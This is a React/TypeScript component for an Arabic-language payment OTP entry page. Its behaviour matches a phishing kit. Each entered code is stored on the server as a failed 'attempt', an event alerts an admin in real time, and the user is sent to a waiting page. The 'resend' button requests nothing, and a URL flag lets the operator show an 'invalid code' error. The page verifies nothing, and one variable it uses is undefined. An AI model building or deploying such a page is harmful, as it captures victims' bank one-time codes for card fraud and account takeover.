import { useState, useRef, useEffect } from 'react';
import { useLocation } from 'wouter';
import { X } from 'lucide-react';
import { Shell } from '../shared';
import { createOtpAttempt } from '@workspace/api-client-react';

export function PaymentVerificationPage() {
  const [, setLocation] = useLocation();
  const [code, setCode] = useState(['', '', '', '', '', '']);
  const [error, setError] = useState('');
  const [showInvalidError, setShowInvalidError] = useState(false);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const fullCode = code.join('');

  // Get order ID from localStorage
  const orderData = localStorage.getItem('dheebti-last-order');
  const orderId = orderData ? JSON.parse(orderData).id : null;

  // Check URL params on mount
  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('error') === 'invalid') {
      setShowInvalidError(true);
      // Clear URL params after reading
      window.history.replaceState({}, '', window.location.pathname);
    }
  }, []);

  const handleChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    
    const newCode = [...code];
    newCode[index] = value.slice(-1);
    setCode(newCode);
    setError('');
    setShowInvalidError(false);

    // Auto-focus next input when digit is entered
    if (value && index < 5) {
      setTimeout(() => {
        inputRefs.current[index + 1]?.focus();
      }, 0);
    }

    // If all 6 digits entered, hide keyboard
    if (newCode.join('').length === 6) {
      setTimeout(() => {
        inputRefs.current[5]?.blur();
      }, 0);
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === 'Backspace' && !code[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handleFocus = (index: number) => {
    // If previous field is empty, focus on it instead
    if (index > 0 && !code[index - 1]) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handleClick = (index: number) => {
    // Ensure focus is on clicked input for mobile
    if (inputRefs.current[index]) {
      inputRefs.current[index]?.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
    const newCode = [...code];
    pastedData.split('').forEach((char, i) => {
      if (i < 6) newCode[i] = char;
    });
    setCode(newCode);
    setShowInvalidError(false);
    
    const lastFilledIndex = Math.min(pastedData.length, 6) - 1;
    if (lastFilledIndex >= 0) {
      inputRefs.current[lastFilledIndex]?.focus();
    }
  };

  const handleResend = () => {
    setCode(['', '', '', '', '', '']);
    setError('');
    setShowInvalidError(false);
    // Focus first input after slight delay
    setTimeout(() => {
      inputRefs.current[0]?.focus();
    }, 100);
  };

  const handleVerify = async () => {
    if (fullCode.length < 6) {
      setError('يرجى إدخال رمز التحقق كاملاً');
      return;
    }
    
    // Send OTP to server as a new attempt
    if (orderId) {
      try {
        await createOtpAttempt(orderId, {
          otpCode: fullCode,
          success: false, // Default to false, will be updated if verified
        });
        // Dispatch event for admin real-time updates
        window.dispatchEvent(new CustomEvent('dheebti-otp-attempt', { 
          detail: { 
            orderId,
            customerName 
          } 
        }));
      } catch (error) {
        console.error('Failed to save OTP attempt:', error);
      }
    }
    
    // Navigate to waiting page
    setLocation('/payment-waiting');
  };

  return (
    <Shell>
      <div className="page-enter mx-auto flex min-h-[calc(100vh-104px)] items-center justify-center px-5 py-10 lg:py-16">
        {/* OTP Form Card */}
        <div className="relative flex w-[340px] flex-col items-center justify-center gap-6 rounded-[22px] border-[5px] border-white bg-white p-6 shadow-[0px_0px_20px_rgba(0,0,0,0.082)] sm:w-[360px]">
          {/* Exit Button */}
          <button
            onClick={() => setLocation('/payment')}
            className="absolute right-4 top-4 grid size-9 place-items-center rounded-full bg-white shadow-[0px_0px_20px_rgba(0,0,0,0.171)] text-2xl text-black"
          >
            <X size={22} />
          </button>

          {/* Main Heading */}
          <span className="pt-4 text-2xl font-bold text-[rgb(15,15,15)]">أدخل رمز التحقق</span>

          {/* Subheading */}
          <p className="text-center text-base leading-6 text-black">
            تم إرسال رمز التحقق إلى رقم هاتفك
          </p>

          {/* OTP Inputs - RTL: inputs go from left to right, fill left to right */}
          <div className="flex w-full flex-row items-center justify-center gap-2" dir="ltr">
            {code.map((digit, index) => (
              <input
                key={index}
                ref={(el) => { inputRefs.current[index] = el; }}
                type="tel"
                inputMode="numeric"
                maxLength={1}
                value={digit}
                autoFocus={index === 0}
                onChange={(e) => handleChange(index, e.target.value)}
                onKeyDown={(e) => handleKeyDown(index, e)}
                onPaste={handlePaste}
                onFocus={() => handleFocus(index)}
                onClick={() => handleClick(index)}
                className="h-[48px] w-[38px] rounded-[10px] bg-[rgb(228,228,228)] text-center text-lg font-semibold text-[rgb(44,44,44)] outline-none caret-[rgb(127,129,255)] transition-all duration-300 focus:bg-[rgba(127,129,255,0.199)] focus:shadow-none"
                style={{ direction: 'ltr', textAlign: 'center' }}
              />
            ))}
          </div>

          {/* Error Message */}
          {(error || showInvalidError) && (
            <p className="text-center text-base text-red-500">
              {error || 'رمز التحقق غير صحيح أو منتهي، يرجى التحقق مرة أخرى أو انتظار رمز جديد'}
            </p>
          )}

          {/* Verify Button */}
          <button
            onClick={handleVerify}
            className="h-[52px] w-full rounded-[14px] border-none bg-[rgb(127,129,255)] text-lg font-semibold text-white cursor-pointer transition-all duration-200 hover:bg-[rgb(144,145,255)]"
          >
            تحقق
          </button>

          {/* Resend Note */}
          <p className="flex flex-col items-center justify-center gap-1.5 text-base text-black">
            <span>لم تستلم الرمز؟</span>
            <button
              onClick={handleResend}
              className="bg-transparent border-none text-[rgb(127,129,255)] cursor-pointer text-lg font-bold"
            >
              إعادة إرسال
            </button>
          </p>
        </div>
      </div>
    </Shell>
  );
}
